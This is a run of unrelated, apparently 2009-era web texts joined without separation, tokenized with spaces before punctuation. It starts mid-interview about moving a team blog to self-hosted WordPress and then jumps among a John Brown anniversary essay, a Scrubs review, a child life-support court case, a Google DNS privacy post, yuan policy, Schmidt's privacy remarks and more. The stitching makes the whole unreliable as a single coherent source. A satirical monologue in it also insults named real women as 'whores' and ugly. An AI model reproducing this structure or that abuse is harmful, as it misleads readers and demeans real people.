Starting from zero traffic and nil visibility , our blog ’s traffic and visibility increased .
2009 was really the breakthrough .
Enrica :
You published a piece about that , did n’t you ?
Antonella :
Yes , I compiled the statistics a few months ago .
It clearly showed “ Content is King ! ” : as more of us started blogging , the diversity of subjects and the depth of the topics expanded .
That attracted more people : the content became more interesting .
Better content , more traffic .
Enrica :
We also got better at social promotion of our contents , both purely in linking what we were doing to published stories , interviews .
We cross -linked posts linking events covered to tutorials on the blog .
We got more experienced at how “ to drive ” people to discover what we do .
Blogtips :
The blog was a tool for your overall Program .
How important a tool has it become ?
Antonella : I think there are two keywords that explain what the blog has done for us .
One is ‘ ease ’ , the other one is ‘ credibility ’ .
It became easy to document and share , to release the occasional announcement , to post pictures and videos , to have non-technical people participate in sharing information .
It has helped us building credibility .
As a lot of what we do requires consensus within the CGIAR , so demonstrating benefits and gains is an important leverage .
With all the emphasis on collaboration , sharing and communications , the blog has been the right way for the team to do what they were preaching about .
Plus , being such a small …
Enrica : but hyperactive !
Antonella : ( laughs ) Yes , … as we are a small but hyperactive group of people , we always strive to get visibility for the diverse activities we carry out for the Program .
The blog taught us a lot about how to communicate and relate to the different communities we belong to .
A blog is based on personal voices and passions , they are just natural ingredients of this medium .
As a principle , in our projects we have always tried to give space to individual interests and voices .
Simone has her soothing way , Nadia her own scientific approach , Tania is practical and factual , Mary has a great journalistic touch , Meena has this old - style elegance in writing about technology , Enrica is the queen of crystal - clear , Michael is the voice of the geek …
The blog is a reflection of that : it is the place where the diverse areas of work , and individual passions have found a stage .
In fact , if you notice , there ’s hardly any technology talk on our blog , but a lot of “ knowledge sharing ” , our favourite flavour of knowledge management .
Blogtips :
While the blog was started by two people , your whole team got involved .
What was their motivation to start blogging ?
Antonella :
It was different for each of us .
As far as I ’m concerned , it ’s been really hard for me to get into blogging until everyday ’s work got aligned with writing about it .
As long as I was working on big corporate system development projects , I felt there was hardly an audience for that .
But as the Program got more and more into online collaboration and social media , we started finding out that there were more and more people in our networks that were working on similar things .
At that point , curating the social media tools series , or writing about traffic analysis or social reporting practices at an international congress , just started to make sense .
It all got in sync with the things I was doing .
Enrica :
That ’s right !
Also , being the knowledge sharing and public goods fanatics we are , writing about what we do is an effective way to take a distance , make it objective , turn experience into a piece of knowledge that others may find useful and reuse .
Blogtips :
That brings us to a few months ago .
You decided to revamp the blog .
Why ?
Antonella :
As more of us started blogging , the blog was getting more traffic and comments .
Our old blog was running on WordPress.com , which became too limiting for us .
Blogtips : How so ?
Antonella :
Our blog had become “ this long slab of text ” which was no longer representing the richness and breadth of the topics we were writing about .
People had no space to shine .
The template was too hard to tweak with a proper navigation .
We could n’t add widgets from the other media we use , like pictures and videos .
Blogtips : Interesting .
This is one of the areas I covered in my series “ How to select the right blog platform “ .
But you did not just move the blog from one platform to the other .
Enrica :
No , we also had the ICT - KM website , which was just pure static HTML coded by hand .
That site had all the background information , and institutional reports , and the newsletter archive .
So we decided to merge it all : the institutional site , the newsletter , and the old blog .
The new blog was to become the central part of our Web presence .
The choice for WordPress.org was quite a natural decision .
Antonella :
The institutional site needed a good cleanup : many of the projects have closed in 2008 - 2009 so the information needed updating .
We were presenting the projects in the context of the Investment Plans , which was at the time the planning tool for the Program activities .
That was out - of - date , so instead of fixing static pages with hard - coded links , we thought we ’d better put the updated information in a different architecture that would represent the state of the Program more realistically .
Enrica :
The main reason for merging the site and the blog was to have ONE site that would cross-link background information , blog posts and publications more effectively , and with some automation in the background .
So for example , we put a lot of attention in designing the side bars , and using categories to aggregate related posts in the project pages .
Blogtips : Merging a blog , a traditional website and a newsletter .
Moving from one blog platform to another .
Migrating your content from a blog hosted by the blog service to selfhosting it .
Quite a feat !
Antonella : WordPress.org gave us the liberty to choose a new template as a basis for our approach .
We gave priority to a layout that would make the typical blog features prominent , like tags , feeds , comments , authors and widgets .
We did n’t want the blog to look like an institutional site .
So it was mostly the content that influenced the choice of the layout .
New categories have been introduced to represent our current interest areas and blog authors have their profile pages and associated feeds , in case one develops a cult following … you never know .
( laughs ) …
Having the blog at the center of the site sort of smoothed out the usual tough decisions about information architecture , like what content we wanted to prioritise , what to put on the home page , etc .
Still , we needed much more flexibility to do all this than WordPress.com was allowing us , so we decided to go for selfhosting .
Going from hosted to selfhosting is like going from renting to buying a house .
It ’s a choice of responsibility , you have to get a mortgage , and learn the condo rules , but then you can model and live your space fully …
Blogtips : Migrating the traditional website itself onto a blog platform .
An interesting challenge by itself !
Antonella :
At the beginning , it looked like migrating the institutional content to the new site would be just a matter of reshuffling pages under new categories .
In reality this required extensive rewriting since most of it was talking about projects in progress , while they are now closed .
So , unless it ’s a real archive that needs to be migrated as it is , editorial work is required .
Blogtips :
Is a blog platform like WordPress.org starting to replace the traditional website Content Management Systems ?
Antonella : WordPress.org is more than enough to manage also the stable content on our Web site .
We do n’t have a deep hierarchy , and page templates were pretty straightforward to implement .
After all , we just needed pages .
The only limit we found was with the library page , where we have groups of links to publications , but no information object structured as a publication record .
If you need to create and structure an information object and a catalogue , I reckon that takes quite some custom development .
As long as a site revolves around a blog and the people who write on the blog , a shallow hierarchy of categories is all you need to house the content .
Then , a blog platform such as WordPress.org is more than OK .
If you need more structured content , controlled lists and catalogues , I ’d look somewhere else .
Enrica : Going for a blog platform is not only a matter of how you decide to manage a site , of course .
It ’s first of all a communication choice .
Blogging implies a certain editorial style , a clear focus on the topics that the bloggers and the audience are interested in .
It ’s very content centric , somehow , and by itself places the emphasis on conversations , informality and people .
Blogtips :
And then you merged your newsletter into your blog ?
Enrica : Yes .
Migrating the newsletter archive was straightforward but we discovered that moving from a Windows server to a Linux one required rewriting and standardizing lower / uppercase URLs so that the links across the newsletter archive could still work correctly .
Blogtips : Ouch !
Antonella :
We have some horror stories about broken links , which affected mainly the static pages .
Migrating the blog database from WordPress.com to WordPress.org as a CMS was a breeze , though .
Blogtips :
You make it sound all too easy !
Antonella :
It sounds easy now that it ’s done , believe me …
Apart from the link - weeding , setting up the new blog to contain three types of content was challenging .
We hired a designer / developer who was very experienced in WordPress .
We just did n’t have the skills in - house , design - and coding - wise .
Matteo of Webeing / Essere Web gave us quite a few good ideas on information architecture and how to make the most out of WordPress .
Blogtips :
And then , two weeks ago , you flipped the switch .
How did that go ?
Antonella :
For reasons still unexplained , we were hit by a spam storm for a couple of days as soon as we switched the domain .
Akismet , the comment spam filter in WordPress , got so strict that it would not let “ valid ” comments go through .
So we had to monitor the situation very closely .
We changed a couple of comment spam plugins , until the storm calmed down and all went back to normal .
All in all , it was a smooth transition .
Blogtips : A new phase in the life of a blog .
What ’s in the future ?
Antonella : I ’m already seeing that we ’re going through a learning process , so for a while we will be adapting and learning a few new things about publishing .
For example , now we need to put more attention into the category selection and picture preparation .
The choice of the plugins will affect the time we devote to managing the site .
As we finally can do proper traffic analysis , using Google Analytics .
Enrica :
That will teach us so much more about traffic patterns and search engines than what the basic stats in WordPress.com allowed us .
We still have some ways to go !
Enrica and Antonella , we wish you the best of success with your new blog , and all of your efforts !
150 years since the execution of John Brown
By Fred Mazelis
4 December 2009
Tragic Prelude , mural in the Kansas State Capitol by John Steuart Curry , 1938 - 1942
Wednesday marked the 150th anniversary of the execution of John Brown for the failed raid he led on the US Federal arsenal at Harpers Ferry , Virginia .
Although his action was doomed to defeat , the revolutionary abolitionist earned his place in history as the man who prophesied and inspired the Civil War , the struggle that must properly be defined as the Second American Revolution .
Brown led a small band of armed men who briefly seized the armory containing some 100,000 weapons .
He hoped to arm slaves and spark a spreading uprising .
After a siege of about 36 hours , however , the abolitionists were overpowered by a company of US Marines under the command of Robert E. Lee .
Ten of the group , including two of Brown ’s sons , were killed .
Five escaped and seven , including Brown himself , were captured .
Brown and the others were quickly tried by the state of Virginia .
On December 2 , 1859 , having been convicted of murder , conspiring in a slave rebellion and treason , John Brown was executed by hanging .
The Harpers Ferry raid highlighted the insoluble contradiction posed by the continued existence of chattel slavery in the country founded on the principles of the Declaration of Independence .
It foreshadowed the war that led to the greatest expropriation of private property the world had ever seen , ushering in the ascendancy of capitalism based on free labor in opposition to slavery .
Brown ’s audacious act of insurrection was greeted by howls of fury in the South and strenuous disavowals by political leaders in the North , including Abraham Lincoln and other leading figures in the Republican Party .
Yet only 16 months after his execution , the final words he submitted to the court as he was led to the gallows —
“ I John Brown am now quite certain that the crimes of this guilty land will never be purged away but with blood ” — were fully borne out .
The four - year Civil War that began in April 1861 took more than 600,000 lives and abolished slavery .
Sesquicentennial observances of the Harpers Ferry raid this year included a four - day program of events in the historic town itself , which is now part of West Virginia , the state formed during the Civil War by an act of secession from the secessionist Confederacy .
Harpers
Ferry today is home to restored buildings and historical museums .
It is part of Harpers Ferry National Historical Park , situated in the three states of Virginia , Maryland and West Virginia , where they meet at the confluence of the Shenandoah and Potomac Rivers .
Among other commemorative events are two ongoing museum exhibits : one at the Virginia Historical Museum in Richmond , the city that was the capital of the slave states that made up the Confederacy , and the other at the New York Historical Society .
The New York City exhibition , small but full of important material , includes original correspondence , posters and advertisements , photographs and other memorabilia .
All of these combine to evoke the period leading up to the Civil War itself , and place Brown ’s raid in its historical context , apart from which it can not be understood .
The Last Moments of John Brown , oil on canvas
painting by Thomas Hovenden , 1882 - 1884
Included are letters between Brown and some of his sons ; the well known painting by Thomas S. Noble from 1867 , John Brown ’s Blessing , showing the martyred abolitionist blessing a black infant ; a broadside , entitled “ John Brown Still Lives , ” announcing an anti-slavery rally to be held in Illinois on December 30 , 1859 , four weeks after Brown ’s execution ; a copy of Julia Ward Howe ’s famous “ Battle Hymn of the Republic , ” the Civil War anthem for which she wrote the lyrics in 1862 , soon after Union soldiers had marched to the same tune , set to the words of “ John Brown ’s Body ” ; and the texts of the 13th , 14th and 15th Amendments , the Reconstruction Amendments that abolished slavery and granted citizenship and voting rights to former slaves and their descendants .
Brown ’s legacy has remained a contested one during the entire period since Harpers Ferry .
He represented the most extreme left wing of the abolitionist movement in his uncompromising commitment to full racial equality and his attempts to organize the slave population itself in the fight for liberation .
The Republican Party , representing the then - progressive interests of Northern capital , hesitated before the task at hand .
In the famous words of Lincoln in his 1862 letter to Horace Greeley , “ If I could save the Union without freeing any slave , I would do it , and if I could save it by freeing all the slaves I would do it ; and if I could save it by freeing some and leaving others alone I would also do that … ”
Abraham Lincoln
Lincoln ’s greatness was demonstrated by his readiness , when history gave him no other choice , to see the battle through with the determination , eloquence and political and military ruthlessness that were required and that have secured his place in history .
It was Brown who insisted on revolutionary struggle , but it was Lincoln and the social forces he represented that led the Civil War to victory over slavery .
As historian Eric Foner recently commented , “ Brown believed that the only way to overthrow slavery was by violence .
Now , that actually turned out to be true . ”
Brown was revered as a martyr during and after the Civil War .
Even before the outbreak of hostilities in 1861 , a definite radicalization in the North was reflected in the reaction to the Harpers Ferry raid from such figures as author Louisa May Alcott , Ralph Waldo Emerson and Henry David Thoreau .
Henry Wadsworth Longfellow wrote in his diary on December 2 , 1859 : “ This will be a great day in our history ; the date of a new Revolution — quite as much needed as the old one .
Even now as I write , they are leading old John Brown to execution in Virginia for attempting to rescue slaves !
This is sowing the wind to reap the whirlwind , which will come soon . ”
From Europe Victor Hugo , then in exile from the regime of Napoleon III in France , appealed for Brown ’s life and warned , “ Politically speaking the murder of John Brown would be an uncorrectable sin… Brown ’s agony might perhaps consolidate slavery in Virginia , but it would certainly shake the whole American democracy …
Let America know and ponder this : there is something more frightening than Cain killing Abel , and that is Washington killing Spartacus . ”
The significance of Brown ’s action was reflected as well in the correspondence of Karl Marx and Frederick Engels .
Marx wrote to Engels in January 1860 , “ In my opinion , the biggest things that are happening in the world today are on the one hand the movement of the slaves in America started by the death of John Brown , and on the other the movement of the serfs of Russia … ”
With the end of the Reconstruction era after the Civil War , John Brown ’s stature in mainstream historiography suffered a sharp reversal .
The former states of the Confederacy set in place a system of rigid segregation .
In the North as well , racism and racial discrimination continued to be the rule , and Brown was vilified by historians and official public opinion .
Early biographies denounced him as a madman and bloodthirsty fanatic , while he remained venerated by the descendants of slaves and by working class fighters and socialists like Eugene Debs , who looked to John Brown ’s legacy in the fight against wage slavery .
In the mid-20th century , amidst the growing struggle against Jim Crow , John Brown commanded growing attention .
In the reactionary political climate of the past three decades , however , there have been continuing attempts to demonize him .
It is not surprising that American capitalism , having long since turned violently against its own revolutionary origins , depicts Brown in the most negative light .
This parallels social and political thinking more broadly .
The leaders of the American Revolution did not believe in organized religion , but today every capitalist politician must wear his religiosity on his sleeve .
The Republican Party of Lincoln is now the party of Bush , Cheney and Sarah Palin .
The ruling elite is well aware that the revolutionary legacy of John Brown is a dangerous topic .
The Times and the “ temptation of terror ”
This is the broader relevance of a recent article on John Brown by New York Times cultural critic - at - large Edward Rothstein .
Rothstein warns in his review of the abovementioned New York City exhibit : “ … can we not also be distressed by the implications of Brown ’s methods , and worry over their enthusiastic embrace over the past 150 years ?
In his welcome of martyrdom , his visions of apocalyptic retribution and his unshakable belief in his own virtue , Brown is now so familiar a type on the world scene that we cannot resist being horrified by the temptation of terror that he succumbed to , even if , as in this particular case , we welcome its long - sought goal . ”
This comment is typical of petty bourgeois moralism of the sort dissected so well by Leon Trotsky in Their Morals and Ours in 1938 .
Revolutionary and counterrevolutionary violence are equated , ignoring the material foundation and historical role of opposed political tendencies .
As Trotsky put it : “ A slaveowner who through cunning and violence shackles a slave in chains , and a slave who through cunning or violence breaks the chains – let not the contemptible eunuchs tell us that they are equals before a court of morality ! ”
As a general rule , the methods of individual terrorism , even when directed against the enemies of humanity , are counterproductive and even reactionary .
The assassination of the Russian Tsar in 1881 , while motivated by revolutionary convictions , did nothing to advance the cause of the struggle against the autocracy .
With actions taken against random innocents and on behalf of obscurantist reaction , as in the instances of Timothy McVeigh and Al Qaeda , the character of such methods is even clearer .
Terror in the midst of a civil war , however , is another matter .
Sherman ’s march through Georgia was part and parcel of the winning of the Civil War .
And John Brown ’s actions , including Harpers Ferry , although misguided from a military standpoint , must be seen in the context of the Civil War .
That is why Civil War historian James McPherson correctly declared in a recent interview that Brown was “ more of a freedom fighter than a terrorist , ” and David S. Reynolds , in his important 2005 biography , “ John Brown , Abolitionist ” , explained that comparisons between Brown and terrorists like McVeigh and anti-abortion assassins were extremely misleading .
There was an element of individual terrorism in Brown ’s action , in the conception that the bold initiative of a small group would spark a mass uprising .
But that is not all , or even the predominant element in John Brown ’s legacy .
The exhibit at the New York Historical Society demonstrates that Brown was part of a growing mass movement .
Brown , the son of an abolitionist , dedicated his life to the eradication of slavery .
From 1837 , in particular , when Illinois journalist Elijah Lovejoy was assassinated by a pro-slavery mob , Brown became increasingly unbending in his outlook .
The decade of the 1850s was the decisive period in the gathering of the opposed class forces that would explode in the Civil War .
The Compromise of 1850 showed the continued strength of the Southern pro-slavery camp in Washington .
The Fugitive Slave Act , part of this intricate legislation , made the Northern states legally responsible for apprehending escaped slaves , and provoked anger and growing radicalization in the North .
The Kansas - Nebraska
Act of 1854 further inflamed the conflict , creating new territories that were eventually to become states , but allowing settlers in these territories to determine whether they would be slave or free .
This was a new means of expanding slavery into the western states in ways that slavery opponents had thought were foreclosed .
Settlers poured into Kansas from both North and South , setting the stage for the battle that gave rise to the term “ Bleeding Kansas . ”
Over the next several years it was to serve as a kind of rehearsal for the Civil War .
Four of Brown ’s sons moved to Kansas in 1855 and Brown joined them later that year .
May 1856 witnessed several thunderbolts in quick succession .
On May 21 the so - called Border Ruffians , pro-slavery settlers in Kansas , sacked the town of Lawrence .
One day later , the gathering storm over slavery exploded in the United States Senate , when Congressman Preston Brooks of South Carolina beat Republican Senator Charles Sumner from Massachusetts so brutally that Sumner needed three years to recover before returning to the Senate .
Dred Scott , painted by L. Schultze , 1882
This was followed by the infamous Dred Scott decision by the US Supreme Court in 1857 , which declared that no slave or descendent of a slave could claim the rights of a US citizen , and that Congress had no authority to outlaw slavery anywhere in the US .
It was in these circumstances that Brown carried out the retaliatory raid in Pottawatomie , Kansas , killing five pro-slavery men .
This incident , even more than Harpers Ferry , has been pointed to as proof of Brown ’s terrorism , but there is strong evidence that these men were not random victims , that they had threatened abolitionists and the Brown family in particular .
As the Harpers Ferry raid further demonstrated , Brown employed violence for definite political purposes and only as a last resort .
Far from a mindless fanatic , Brown met with such figures as Emerson and Thoreau , and with black abolitionists like Frederick Douglass and Harriet Tubman .
Though devoutly religious , Brown numbered among his adherents Jews like August Bondi and agnostics as well .
As Reynolds and others have pointed out , Brown possessed an unusual eloquence .
This was not incidental , but was rather the expression of his revolutionary role and consciousness of the class divisions within American society .
As he testified to the court at his trial :
“ Had I interfered in the manner which I admit …had I so interfered in behalf of the rich , the powerful , the intelligent , the so - called great , or in behalf of any of their friends , either father , mother , brother , sister , wife , or children , or any of that class , and suffered and sacrificed what I have in this interference , it would have been all right .
Every man in this Court would have deemed it an act worthy of reward rather than punishment …
I believe that to have interfered as I have done , as I have always freely admitted I have done , in behalf of His despised poor , I did no wrong , but right .
Now , if it is deemed necessary that I should forfeit my life for the furtherance of the ends of justice , and mingle my blood further with the blood of millions in this slave country whose rights are disregarded by wicked , cruel and unjust enactments , I say , let it be done . ”
This is the statement of a genuine revolutionary figure , and was recognized as such at the time .
Which brings us back to the issue of why Brown ’s legacy troubles the cultural critic of the Times , and what lies behind the refusal to recognize him as one of the authentic revolutionary figures in American history .
What worries Mr. Rothstein is not violence per se .
He is perfectly comfortable with the employment of violence by the capitalist state on a colossal scale , but to the masses of people who have no future under capitalism he preaches slavery and submission .
A new “ irrepressible conflict ” is taking shape in the US and around the world .
The profit system of wage slavery , a system that led to the vast development of the productive forces of society in John Brown ’s day , has in the past century led to catastrophic world wars , massive poverty and threats to the very survival of humanity .
Future generations will see that the sanctification of private ownership of the means of production has produced the legal enslavement of the vast majority of the population , through the mechanisms of unemployment , crushing debt and social misery .
Apologists for bankrupt capitalism are worried that working people will draw the lessons of John Brown ’s life , that revolutionary struggle is necessary to sweep away an outmoded social order .
Good job , TV people !
The new Scrubs is frankly just great .
All the usual absurdity remains , along with just enough of J.D. , Turk , Dr. Cox and Kelso to make the series seem like the one you know and love , but the new kids all turn out to be incredibly watchable and fresh .
If you 've been a Scrubs fan for a while , their humor and peccadilloes will seem familiar , but the new people make everything seem shiny , fresh and new .
But before we get too deep into telling you about the new kids , let 's circle back to the beloved old gang .
You 'll be happy to hear that both Neil Flynn and Sarah Chalke make token appearances in the first episode back ( airing Dec. 1 ) .
The show gives Neil Flynn 's Janitor a very amusing exit story that we wo n't spoil here .
And actually pregnant Chalke appears in the season premiere as J.D. 's seven - months - preggo baby mama .
The rest of the originals keep doing their thing : J.D. ( Zach Braff ) and Turk ( Donald Faison ) are still in love , Dr. Cox ( John C. McGinley ) is still a delightful jerk , the Todd ( Robert Maschio ) is still a perv , Kelso ( Ken Jenkins ) is still a curmudgeon and all is right with the world .
As for the so - called " next generation , " we encounter them in the lovely new university hospital , which appears to be a modernist building situated on a Southern plantation .
( It 's a million times prettier than dumpy ol ' Sacred Heart , and you 'll dig it . )
Eliza Coupe returns as prickly , seemingly emotionless Denise , except now she 's met her match in older - than - average , smartass med student Drew ( Michael Mosley ) .
The new antagonist is Dave Franco , who plays Cole , a smug , sleazy , entitled douche whose character seems to be half Chuck Bass , half wannabe .
( It takes him about 15 minutes to start giving Turk fits . )
The standout , though , is Kerry Bishé as Lucy , a fragile and sweet young med student who takes J.D. 's role as Cox 's punching bag of choice .
Lucy is hilariously naive and hopeful , and you can't help but care what happens to her .
In short , we retract all our previous reservations about season nine , and we 're delighted that creator Bill Lawrence and ABC were able to work out a continuation to the series .
The deal seems to be paying off nicely for us fans !

1981 Delorean DMC - 12 expertly modified to look exactly like the vehicle featured in the film “ Back to the Future . ”
This incredibly accurate replica of the Delorean Time Machine was painstakingly built by Gary Weaver over the course of 2 years , from 2006 - 2008 .
This is the only car Gary has ever built on commission , and , other than his own personal car , is the only one he has finished to his complete satisfaction .

The father of a baby with a rare genetic condition has withdrawn his opposition to a legal plea by doctors and the boy 's mother to switch off his life support .
The one - year - old , known only as RB , suffers from congenital myasthenic syndrome , which has left him with little muscle control and on a ventilator since an hour after his birth .
Medical staff at the NHS hospital where he is being treated want to turn off the baby 's life support and let him die , saying RB is consigned to leading " a miserable , sad and pitiful existence " .
His mother has supported their application .
But the boy 's father had been fighting the high court action , saying everything possible should be done in an attempt to prolong the boy 's life , suggesting that a tracheostomy – creating an opening in his neck to help air to his lungs – might enable him to be cared for at home .
But the father 's change of position came on the seventh day of an emotionally charged hearing at the family court in which the judge had to decide whether the chronically disabled baby should be allowed to live or die after withdrawal of ventilation .
The judge made an order that RB 's parents and the trust should now make arrangements to bring the baby 's life to " a dignified end " .
Lawyers for the health authority caring for the baby in intensive care told Mr Justice McFarlane that all parties in court now agreed that it would be in the boy 's best interests for the course suggested by the doctors to be followed .
The judge said such a course , with palliative care , would be lawful , and paid tribute to the boy's now separated parents who had been " exemplary " in attending their son 's hospital bedside every day during his short life .
It was a " sad but in my view inevitable outcome " and the " only tenable one for RB " , he said .
Both parents wept and the mother at one point left the court in tears .
The hospital authority had sought a court order allowing RB to die with dignity rather than continuing to live what doctors described as a " miserable and pitiful " existence .
The father initially opposed the application , arguing his son showed signs of " purposeful " movement when presented with toys and should have the chance to live , though chronically disabled .
Expert medical witnesses described RB as having a normal brain locked inside an immobile and " non-communicative " body .
They were concerned he was unable to show , by facial expression or bodily movement , when he was in pain during the stressful treatment he had to undergo , including regular suctioning of his airways to remove fluid .
The court heard from counsel that it was a decision the father , AB had come to " after a very great deal of thought after hearing all the evidence as it has developed in this case " .
A joint statement later issued by lawyers involved in the case added : " This has been an agonisingly difficult decision .
RB 's parents would now wish to spend what little time remains with their beloved son . "
The judge said : " It is , I suspect , impossible for those of us to whom such an event has not happened to do more than guess at the impact of it upon these two young parents .
" In one moment all of the hopes and dreams that they will have had for their expected baby will have been dashed and replaced with a life characterised by worry , stress , exhaustion , confusion and no doubt great sadness . "
He said : " During the past 13 months both KM and AB have discharged their responsibility to their son in a manner which has been described by all who have seen it in superlative terms . "
The judge went on : " It is a fact that K and A have spent the most part of each and every day of the last 13 months at RB 's bedside , doing what they can to care for him and , when the opportunity arises , to interest and stimulate him , seizing upon any sign of a spark and trying to develop it into something more .
" They have put their own adult lives on hold .
The stress has been immense , it has cost them their relationship but still they work together and do what they can to support their son .
" When faced with the awfulness of the situation in which they found themselves , these two young people have stepped up to the plate and discharged the responsibility that life had thrust upon them by each showing 100 % commitment to their child in a manner which can only command profound respect and admiration . "
The judge said he had " total confidence " that RB 's parents and the medical team had done all they could to make his life " as viable , comfortable and enjoyable as it could be " .
An anonymity order protecting the identities of the parents , hospital trust and health professionals caring for the boy remains in force .
Congress has extended energy efficiency tax credits for most homeowners through the end of 2010 , so if you ’ve been looking to upgrade your water heater or windows and doors , you can probably still get a tax credit in the coming year .
Some less common of the tax credits for home improvements will be around all the way until 2016 .
From EnergyStar.gov
If you purchase an energy - efficient product or renewable energy system for your home , you may be eligible for a federal tax credit .
…
Please note , not all ENERGY STAR qualified products qualify for a tax credit .
ENERGY STAR distinguishes energy efficient products which , although they may cost more to purchase than standard models , will pay you back in lower energy bills within a reasonable amount of time , without a tax credit

While many of us are making our New Year 's resolutions and looking back on what we accomplished , a lot of social media companies are sifting through their data and sharing what was hot in 2009 .
Yahoo , Bing , Twitter and Facebook have already revealed their top searches and most - discussed trends and stories of 2009 .
While social media giant Digg has yet to release such a list , it did recently launch a tool called Digg 365 , which summarizes the top stories for every day , month and year on Digg since 2005 .
With the information on the social media tool 's most dugg stories at our fingertips , we decided to figure out what diggers cared about most .
Thus , we uncovered the top 10 stories for Digg in 2009 .
While some match top trends on Twitter , Facebook and others ( e.g. Barack Obama 's election , Michael Jackson 's death ) , other stories were decidedly humor only Diggers can truly understand .
Here 's are Digg 's top stories this year :

Google has announced that they are offering a free DNS service to anyone wanting to use it .
Unfortunately the motivations / privacy concerns are n't being discussed in as much detail as I 'd like , and people are n't asking the important question of why google is offering such a free service .
Several points to consider
Google can profile a given IP for which countries they visit , or which types of sites they prefer .
Google can identify sites you visit that lack google analytics / google ads , allowing google to know everything you connect to .
Google states they do n't share the data with analytics or google ads , it does n't seem to say it wo n't share this data with others .
Google may see queries to internal hostnames on your local corporate intranet / lan when you attempt to visit an internal site .
Google will be able to see the software products an IP uses , if those products perform web based updates .
Google will be able to tell if you 're infected with malware , if that malware contacts hostnames for payload updates .
This allows google to know if you 're backdoored / infected which hypothetically means this information could be used to gather a list of hacked hosts .
It also gives them the potential to control the payloads used by bots not using payload verification / signing .
Am I saying google will do something with this information ?
Unlikely .
While it is true your ISP is in a similar position ( although chances are they could n't retain or analyze the traffic like google can due to lack of resources ) , your ISPs motivation of offering you DNS is to make the web work , while google 's has some sort of yet to be determined financial benefit ( they are a publicly traded company looking out for shareholders after all ) which is likely related to your personal habits .
I believe google is doing the right thing regarding speeding up the web , however I have concerns that one day many people will regret handing over so much information to google .
Hopefully once the original founders leave google entirely the do no evil message remains intact .
The motivation for this post is that you should be aware how much information you give away to one particular company , while the service is ' free ' you 're paying a yet to be determined price .

NANJING , CHINA — China pushed back Monday against calls to let its currency rise , with Prime Minister Wen Jiabao warning that an appreciation in the yuan could hobble Chinese growth .
Speaking to reporters after a summit meeting with the European Union , Mr. Wen said the demands being made of Beijing to let the yuan strengthen were not fair .
He reaffirmed China ’s determination to take its own , gradual steps with regards to the currency but said that for now the yuan , also known as the renminbi , would be kept steady .
“ In this international financial crisis of a kind rarely seen in history , maintaining the basic stability of the renminbi exchange rate has benefited China ’s economic development and benefited world economic recovery , ” Mr. Wen said .
Because you must be wondering that , right ?
I mean I ’m rich .
I ’m famous .
People worship me .
Plus , I can hypnotize people pretty much at will .
And , let ’s be honest , when you put me next to Larry , and Eric , and even Bill Clinton , or really almost anyone , well , I ’m a lot better looking .
That ’s not bragging .
Because it ’s not something I can really take credit for .
It ’s just the way I look .
Anyway , the reason I ’ve never been busted is that I simply do n’t cheat .
And this is not because I ’m some great guy , because , yeah .
It ’s just that I can never work up the energy to be interested in other people .
Male or female .
I just ca n’t stand them .
Not. At. All .
Also , with sex , there ’s the touching thing , and with that the germ thing .
Bigger reason , however , is that you have to sit there and talk to someone , and then you have to pretend to listen when they ’re talking , and then you have to get rid of them once you ’re done with them — oy .
Who needs it ?
I mean look at these whores who claim they ’ve been hooking up with Tiger .
First of all , they ’re all the kind of girls who maybe look good in very dim light ( which is why they work in nightclubs , hello ) but when you see the photos , wow !
These are some ugly girls .
I mean if I had a dog and it looked like Jaimee Grubbs , I ’d shave its ass and teach it to walk backwards .
Rachel Uchitel looks way too much like Steven Tyler of Aerosmith for my liking .
But ugly is n’t the biggest problem .
The problem is , Can you imagine what these women sound like when they ’re talking ?
Can you imagine what they must talk about ?
Yap - yap - yap , about — what ?
The only way I could imagine ever being tempted would be if some scientist created a complete perfect 100 % replica of me , and then if that replicant happened to live next door to me and I ran into him / me and one thing led to another .
But that ’s not even going to happen .
so let ’s not worry about it .
Since this is a mathematics question , let 's assume the intention was to find :
sqrt ( aduck ) which would make perfect sense if aduck was just a base 31 number .
So let 's convert to base 10 and compute :
sqrt( aduck ) = sqrt( 10*31^4 + 13*31^3 + 30*31^2 + 12*31 + 20 ) = 3106.72094 ( decimal )
It could also be a higher base , but with no additional information this is the minimum .
Converting back to base 31 the answer is approximately 377 .

WASHINGTON , Oct. 29 ( UPI ) --
Two Quaker organizations praised the signing of a measure requiring the U.S. Defense Department to update lawmakers on the progress of the withdrawal from Iraq .
U.S. President Barack Obama signed a measure that requires the Pentagon to provide lawmakers with quarterly reports on the progress toward a Dec. 31 , 2011 , withdrawal date from Iraq as outlined in a bilateral status of forces agreement .

Two Quaker organizations , the American Friends Service Committee and the Friends Committee on National Legislation , note the legislation is the first since the U.S. - led invasion in 2003 that affirms the U.S. military is committed to a specific date to leave Iraq .
Both groups work toward peace and reconciliation in the spirit of the Quaker tradition .
" We congratulate Senate Armed Services Chairman Carl Levin and House Armed Services Chairman Ike Skelton for including this important milestone in the 2010 military authorization bill , " said Aura Kanegis , director of public policy for the American Friends Service Committee .
U.S. military commanders in Iraq had expressed concern that the security situation in Iraq may deteriorate in the wake of January elections .
Jim Fine , a foreign policy advocate at the Friends Committee on National Legislation , said the Pentagon reports give new impetus to the military timeline .
" Now the Pentagon will issue month - by - month reports on the progress made to close down bases or transfer them to the Iraqi government , which adds new teeth to this historic provision , " he said .

It 's an intriguing challenge .
As part of this program they have pdf files available that detail regional culinary items that are at risk .
Not every region of the country is included , however do n't let that deter you .
They have guidelines for becoming a Food Detective where you can help to document the status of endangered food in your area .
A starting point in finding foods in your area that are endangered is Slow Foods Arc of Taste USA which is here .
Within the categories of the Arc of Taste USA you will find a link to Local Harvest , which has a list of producers in your area that might have the endangered foods available , and seed specialty companies that focus on specific endangered fruits and vegetables
Speaking of specialty seed , another option is grow the endangered fruits and vegetables in your garden , or if you have a farm , grown them there and house livestock on your farm .
If you need to find seeds , there are seed sources such as Baker Creek Heirloom Seeds , Seed Savers Exchange , and Seeds of Change .
There is a saying about turning over a new leaf when you want to make a fresh start .
Here 's your opportunity to do so at the new year .
Why not make that new leaf a regional endangered one ?

“ The innocent have nothing to fear . ”
That seems to be more or less the position of Google CEO Eric Schmidt when it comes to online privacy , and Schmidt ’s comments to that effect have set off a firestorm of controversy over the web company ’s commitment to its users ’ privacy .
In an interview broadcast late last week , CNBC ’s Maria Bartiromo asked Schmidt if people could trust the world ’s leading search engine company with their private information .

“ I think judgment matters , ” Schmidt responded .
“ If you have something that you do n’t want anyone to know , maybe you should n’t be doing it in the first place .
If you really need that kind of privacy , the reality is that search engines , including Google , do retain this information for some time and it ’s important , for example , that we are all subject in the United States to the Patriot Act .
It is possible that all that information could be made available to the authorities . ”
That comment has raised criticism from privacy advocates and even some competing firms in the online world .
